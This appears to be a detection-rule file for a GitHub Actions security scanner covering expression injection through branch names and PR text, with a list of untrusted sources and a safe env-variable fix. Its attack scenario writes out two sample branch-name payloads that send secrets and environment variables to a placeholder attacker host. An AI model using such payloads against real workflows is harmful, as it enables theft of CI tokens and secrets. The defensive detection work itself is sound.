id: RGS-002
name: "Expression Injection via Branch Name or Untrusted Input"
severity: critical
description: >
  A `run:` block in a GitHub Actions workflow contains a `${{ }}` expression that
  directly interpolates a Tier-1 untrusted input source. Tier-1 sources include:
  `github.event.pull_request.title`, `github.event.pull_request.body`,
  `github.event.issue.title`, `github.event.issue.body`,
  `github.event.comment.body`, `github.event.review.body`,
  `github.event.discussion.title`, `github.event.discussion.body`,
  `github.head_ref`, `github.event.pull_request.head.ref`,
  `github.event.pull_request.head.label`, and `github.event.workflow_run.head_branch`.
  These values are fully controlled by external users and are injected directly into
  the shell script before execution, enabling arbitrary command injection. GitHub
  Actions expression interpolation happens before the shell ever sees the script,
  meaning no amount of shell quoting in the workflow file can prevent injection --
  the attacker's payload becomes part of the script source code itself.

tags:
  - injection
  - expression-injection

attack_scenario: >
  An attacker creates a branch with a name containing a shell metacharacter payload,
  such as `feature/$(curl -s https://evil.com/exfil?token=$(cat /run/secrets/*))`
  or `test"; curl https://evil.com/pwn -d @<(env); echo "`. When a pull request is
  opened from this branch, the workflow interpolates `${{ github.head_ref }}` directly
  into a `run:` block. Because expression interpolation happens at the template level
  before bash execution, the attacker's payload is spliced directly into the shell
  script and executes with full runner privileges. The attacker can exfiltrate
  environment variables (which contain GITHUB_TOKEN and any configured secrets passed
  via env), install backdoors, modify repository contents, or pivot to connected
  infrastructure. The same attack applies to PR titles, issue bodies, comment bodies,
  and any other Tier-1 source that an external contributor controls.

real_world_incident: >
  Microsoft disclosed a widespread pattern of expression injection vulnerabilities
  across GitHub Actions workflows in 2022-2023. Researchers from GitHub Security Lab
  identified hundreds of repositories -- including major open-source projects and
  Microsoft's own repositories -- where branch names, PR titles, or commit messages
  were directly interpolated into run blocks. The pattern was so common that GitHub
  Security Lab published dedicated guidance and tooling to detect it. Specific
  incidents included injection via `github.head_ref` in CI/CD pipelines that allowed
  arbitrary code execution in the context of the target repository.

fix: |
  **Never interpolate `${{ }}` expressions directly in `run:` blocks.** Instead,
  pass untrusted values through environment variables, which are properly escaped
  by the shell.

  **Vulnerable pattern:**

  ```yaml
  # DANGEROUS: Direct interpolation -- attacker controls the shell script
  - run: |
      echo "Building branch ${{ github.head_ref }}"
      echo "PR title: ${{ github.event.pull_request.title }}"
  ```

  **Safe pattern using environment variables:**

  ```yaml
  # SAFE: Values are passed as environment variables, properly escaped by the shell
  - run: |
      echo "Building branch ${BRANCH_NAME}"
      echo "PR title: ${PR_TITLE}"
    env:
      BRANCH_NAME: ${{ github.head_ref }}
      PR_TITLE: ${{ github.event.pull_request.title }}
  ```

  **Why this works:** When you use `${{ }}` in the `env:` mapping, the value is
  assigned to an environment variable. When the shell script references `${BRANCH_NAME}`,
  the shell treats it as a data value, not as executable code. Shell metacharacters
  in the value are not interpreted as shell syntax.

  **Complete list of Tier-1 sources to never interpolate directly:**

  ```
  github.head_ref
  github.event.pull_request.title
  github.event.pull_request.body
  github.event.pull_request.head.ref
  github.event.pull_request.head.label
  github.event.issue.title
  github.event.issue.body
  github.event.comment.body
  github.event.review.body
  github.event.discussion.title
  github.event.discussion.body
  github.event.pages.*.page_name
  github.event.commits.*.message
  github.event.commits.*.author.email
  github.event.commits.*.author.name
  github.event.workflow_run.head_branch
  ```

  **For `if:` conditions**, use explicit comparison rather than interpolation:

  ```yaml
  # SAFE in if: conditions (evaluated as expression, not shell)
  if: github.event.comment.body == '/deploy'
  ```

